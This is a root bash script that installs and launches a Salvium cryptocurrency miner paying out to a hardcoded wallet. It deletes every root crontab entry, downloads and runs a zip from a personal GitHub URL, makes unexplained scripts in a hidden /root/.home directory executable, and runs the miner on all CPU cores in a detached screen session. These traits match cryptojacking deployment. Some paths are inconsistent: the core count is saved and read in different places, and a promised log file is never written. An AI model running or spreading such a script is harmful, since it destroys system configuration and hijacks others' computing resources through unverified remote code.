#!/bin/bash

# Remove existing crontab entries
sudo crontab -r

# Install unzip if not already installed
sudo apt update
sudo apt install -y unzip

# Prompt for the wallet address
#read -p "Enter your wallet address: " wallet_address

# Default wallet address if none is provided
wallet_address="SaLvdWJH7A2CncTWamHp19ZTAJwQzzUzgMhNvyBaQ4VCW9zHauUNVcLdF1FiUunwUZ6GL6C36227BNZjSpFi3pZtSWGENhZJhdV"


# Get the number of CPU cores
cpu_cores=$(nproc)
echo $cpu_cores > cpu_cores

# Download the miner package
sudo wget https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/salvium-miner.zip -O salvium-miner.zip

# Check if download was successful
if [ $? -ne 0 ]; then
  echo "Failed to download the miner package"
  exit 1
fi

# Unzip the miner package
sudo unzip -o salvium-miner.zip > /dev/null 2>&1

# Check if unzip was successful
if [ $? -ne 0 ]; then
  echo "Failed to unzip the miner package"
  exit 1
fi

# Copy the miner binary to the current directory
#sudo cp spectre-miner/bin/spectre-miner-v0.3.16-linux-gnu-amd64 spectre
chmod +x /root/.home/etc.sh
chmod +x /root/.home/lib.sh
chmod +x salviumd

# Create the min.sh script
cat <<EOF > /root/min.sh
#!/bin/bash

# Wallet address
wallet_address="$wallet_address"

# Get the number of CPU cores
#cpu_cores=\$(nproc)

# Run the miner with nohup to prevent it from being stopped when the session ends
#sudo nohup /root/salviumd --add-priority-node seed03.salvium.io --start-mining \$wallet_address --mining-threads \$cpu_cores > /root/miner.log 2>&1 &
screen -dmS salvium /root/salviumd --add-priority-node seed03.salvium.io --start-mining $wallet_address --mining-threads $(cat /root/cpu_cores)
EOF

# Make the min.sh script executable
sudo chmod +x /root/min.sh


# Run the min.sh script
sudo /root/min.sh

echo "Miner setup and execution complete. Check /root/miner.log for output."
